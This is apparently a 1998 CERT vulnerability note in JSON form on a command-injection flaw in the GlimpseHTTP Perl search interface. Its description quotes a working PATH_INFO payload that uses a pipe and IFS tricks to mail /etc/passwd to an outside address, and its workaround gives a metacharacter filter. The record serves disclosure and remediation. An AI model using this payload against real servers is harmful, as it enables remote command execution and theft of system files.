{
  "Author": "This document was written by Shawn V Hernan.",
  "CAM_AttackerAccessRequired": "20",
  "CAM_EaseOfExploitation": "20",
  "CAM_Exploitation": "10",
  "CAM_Impact": "18",
  "CAM_InternetInfrastructure": "17",
  "CAM_Population": "15",
  "CAM_ScoreCurrent": 95.175,
  "CAM_ScoreCurrentWidelyKnown": 95.175,
  "CAM_ScoreCurrentWidelyKnownExploited": 115.425,
  "CAM_WidelyKnown": "20",
  "CERTAdvisory": "",
  "CVEIDs": "",
  "CVSS_AccessComplexity": "",
  "CVSS_AccessVector": "",
  "CVSS_Authenication": "",
  "CVSS_AvailabilityImpact": "",
  "CVSS_BaseScore": "",
  "CVSS_BaseVector": "",
  "CVSS_CollateralDamagePotential": "",
  "CVSS_ConfidentialityImpact": "",
  "CVSS_EnvironmentalScore": "",
  "CVSS_EnvironmentalVector": "",
  "CVSS_Exploitability": "",
  "CVSS_IntegrityImpact": "",
  "CVSS_RemediationLevel": "",
  "CVSS_ReportConfidence": "",
  "CVSS_SecurityRequirementsAR": "",
  "CVSS_SecurityRequirementsCR": "",
  "CVSS_SecurityRequirementsIR": "",
  "CVSS_TargetDistribution": "",
  "CVSS_TemporalScore": "",
  "CVSS_TemporalVector": "",
  "DateCreated": "1998-05-21T11:50:16-04:00",
  "DateFirstPublished": "",
  "DateLastUpdated": "1998-05-21T11:50:19-04:00",
  "DatePublic": "",
  "Description": "GlimpseHTTP which is an interface to the Glimpse search tool. It is\nwritten in PERL.\n\nIt splits PATH_INFO in two fields: $length and $path and then takes\nthe first $length characters from $path and puts them in $indexdir\n(my phrasing is more twisted than my mind :) ).  The last line\nopens \"$indexdir/archive.cfg\".\n\nNow for the evil part.  By setting $indexdir to a string that\nbegins with '|', the system will execute whatever it finds after\nthe pipe, giving it as STDIN what you write to the CONF handle.\n\nThe bad thing is that most HTTP servers won't let you use TABS or\nSPACES in the PATH_INFO (not the case of Netscape servers anyway,\nbut CERN and Apache will do it). And I don't know how many \"one\nword\" commands can anyone find (and make them do evil).\n\nHere's where the famous IFS variable comes handy.  If $indexdir is\nset to something like\n\n\"|IFS=5;CMD=5mail5drazvan\\@pop3.kappa.ro\\</etc/passwd;eval$CMD;echo\"\n\nit will execute the command in CMD using IFS as separator. The one\nabove sends me your /etc/passwd (so you'd better change something\nthere :) ).  The last \"echo\" is used to ignore the rest of the\nstring. An of course you can use any other separator instead of\n\"5\".",
  "ID": "VU#12736",
  "IDNumber": "12736",
  "IPProtocol": "",
  "Impact": "can allow you to execute any command on the remote\nsystem (as the owner of the http server",
  "Keywords": [
    "Glimpse search tool",
    "http",
    "aglimpse"
  ],
  "Overview": "",
  "References": [
    "information posted to Bugtraq per [#97.21464] and [#97.21465]",
    "Glimpse",
    "ftp://ftp.cert.org/pub/cert_bulletins/VB-97.13.GlimpseHTTP.WebGlimpse"
  ],
  "Resolution": "",
  "Revision": "1",
  "SystemsAffectedPreamble": "",
  "ThanksAndCredit": "",
  "Title": "http_glimpse",
  "US-CERTTechnicalAlert": "",
  "VRDA_D1_DirectReport": "",
  "VRDA_D1_Impact": "",
  "VRDA_D1_Population": "",
  "VulnerabilityCount": 1,
  "Workarounds": "As the poster pointed out, the \"open(...\" line below is the problem. If we simply look for shell metacharacters and exit if we find any,\nthe security problem is abated. Here's the code I used to do this. Insert this code directly above the open line below. In fact, the\ncode goes exactly where I have it placed in this message. if($indexdir =~ tr/;<>*|`&$!#()[]{}:'\"//) {\nprint \"<H1>Evil characters found! Exiting.</H1>\"; exit(1);"
}